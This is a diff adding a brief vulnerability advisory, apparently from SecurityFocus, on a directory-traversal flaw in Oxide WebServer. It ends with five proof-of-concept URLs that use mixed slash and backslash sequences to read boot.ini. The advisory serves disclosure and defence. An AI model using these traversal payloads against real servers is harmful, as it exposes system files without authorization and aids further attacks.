@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/50845/info
+
+Oxide WebServer is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input submitted to its web interface.
+
+Exploiting this issue will allow an attacker to view arbitrary files within the context of the webserver. Information harvested may aid in launching further attacks. 
+
+http://www.example.com/..\..\..\boot.ini
+http://www.example.com/..\\..\\..\\boot.ini
+http://www.example.com/..\/..\/..\/boot.ini
+http://www.example.com//..\/..\/..\boot.ini
+http://www.example.com/.\..\.\..\.\..\boot.ini
+
